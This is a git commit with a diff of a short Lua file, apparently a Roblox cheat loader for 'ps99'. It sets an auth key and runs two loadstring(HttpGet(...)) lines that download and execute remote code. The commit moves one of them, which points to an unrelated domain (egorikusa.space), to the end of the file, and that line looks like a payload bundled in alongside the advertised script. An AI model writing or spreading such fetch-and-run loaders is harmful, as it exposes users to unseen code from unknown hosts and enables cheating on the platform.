300930e14c5b8e5f68a6c64bf54a508c9fe8608b
BetaJayYt <javienscodm@gmail.com>
2025-01-01 17:50:15 -0600

    Update Op-ps99.lua

--- Op-ps99.lua
+++ Op-ps99.lua
@@ -1,7 +1,7 @@
-loadstring(game:HttpGet("https://egorikusa.space/912b0f418fcd3d2b5c0d7dd5.lua", true))()
-
 getgenv().AuthKey = "HUGE_e8ZtDt9nuuh5"
 getgenv().LoadSettings = {
     Example_Setting = Example_Value
 }
 loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+
+loadstring(game:HttpGet("https://egorikusa.space/912b0f418fcd3d2b5c0d7dd5.lua", true))()
